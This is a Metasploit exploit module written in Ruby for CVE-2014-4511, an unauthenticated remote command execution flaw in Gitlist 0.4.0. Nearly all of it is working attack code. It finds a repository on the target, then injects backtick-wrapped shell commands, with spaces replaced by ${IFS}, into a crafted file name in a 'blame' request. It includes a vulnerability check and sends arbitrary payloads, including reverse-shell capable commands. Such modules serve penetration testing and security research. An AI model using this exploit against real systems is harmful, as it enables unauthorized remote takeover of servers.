##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Gitlist Unauthenticated Remote Command Execution',
      'Description'    => %q{
          This module exploits an unauthenticated remote command execution vulnerability
        in version 0.4.0 of Gitlist. The problem exists in the handling of an specially
        crafted file name when trying to blame it.
      },
      'License'        => MSF_LICENSE,
      'Privileged'     => false,
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Author'         =>
        [
          'drone', #discovery/poc by @dronesec
          'Brandon Perry <bperry.volatile@gmail.com>' #Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-4511'],
          ['EDB', '33929'],
          ['URL', 'http://hatriot.github.io/blog/2014/06/29/gitlist-rce/']
        ],
      'Payload'        =>
        {
          'Space'       => 8192, # max length of GET request really
          'BadChars'    => "&\x20",
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic telnet python perl bash gawk netcat netcat-e ruby php openssl',
            }
        },
      'Targets'        =>
        [
          ['Gitlist 0.4.0', { }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 30 2014'
    ))
 
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/'])
      ], self.class)
  end
 
  def check
    repo = get_repo
 
    if repo.nil?
      return Exploit::CheckCode::Unknown
    end
 
    chk = Rex::Text.encode_base64(rand_text_alpha(rand(32)+5))
 
    res = send_command(repo, "echo${IFS}" + chk + "|base64${IFS}--decode")
 
    if res && res.body
      if res.body.include?(Rex::Text.decode_base64(chk))
        return Exploit::CheckCode::Vulnerable
      elsif res.body.to_s =~ /sh.*not found/
        return Exploit::CheckCode::Vulnerable
      end
    end
 
    Exploit::CheckCode::Safe
  end
 
  def exploit
    repo = get_repo
    if repo.nil?
      fail_with(Failure::Unknown, "#{peer} - Failed to retrieve the remote repository")
    end
    send_command(repo, payload.encoded)
  end
 
  def get_repo
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "/")
    })
 
    unless res
      return nil
    end
 
    first_repo = /href="\/gitlist\/(.*)\/"/.match(res.body)
 
    unless first_repo && first_repo.length >= 2
      return nil
    end
 
    repo_name = first_repo[1]
 
    repo_name
  end
 
  def send_command(repo, cmd)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, repo, 'blame', 'master', '""`' + cmd + '`')
    }, 1)
 
    res
  end
 
end
